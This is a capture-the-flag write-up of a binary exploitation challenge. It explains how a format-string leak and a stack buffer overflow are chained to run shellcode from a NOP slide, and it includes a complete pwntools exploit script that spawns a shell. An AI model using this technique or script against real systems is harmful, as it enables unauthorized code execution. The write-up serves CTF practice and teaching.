# nothing more to say

## pwn - Points: 78

> Japan is fucking hot. nc nothing.chal.ctf.westerns.tokyo 10001
>
> [warmup](warmup)
>
> [warmup.c](warmup.c)

The binary has no security mechanisms enabled, we can overflow the buffer and can exploit format strings! This gives many exploit possibilities, I decided to place shellcode on the stack and overwrite the `RIP` to jump to it. The only challenge is to deal with `ASLR` and find a reliable way to leak an address that points on the shellcode.

Thanks to the format string vulnerability I could search for offsets whose contents are addresses that point somewhere in the program memory space and calculated offsets that point to the overwritten buffer. So on the first stage the input is a format string to leak an address and overflow the `RIP` to point to the `main` function to recursively call it again for another input.

On the second stage the input is a large `NOP` slide and then the shellcode and an address to overwrite the `RIP` that hopefully points somewhere on the `NOP` slide.

Exploit script:

```python
from pwn import *


context.clear(arch='amd64')
shellcode = asm(shellcraft.sh())

p = process('warmup')
# p = remote("nothing.chal.ctf.westerns.tokyo", 10001)

p.recvuntil(':)\n')

fmt_str = '%47$p'
p.sendline(fmt_str + '\x41' * (264-len(fmt_str)) + p64(0x4006ba))

resp = p.recvuntil(':)\n')
print resp

stk = resp[2:14]
RIP = p64(int(stk,16) - 400)

p.sendline('\x5a' * (264-len(shellcode)) + shellcode + RIP)
p.interactive()
```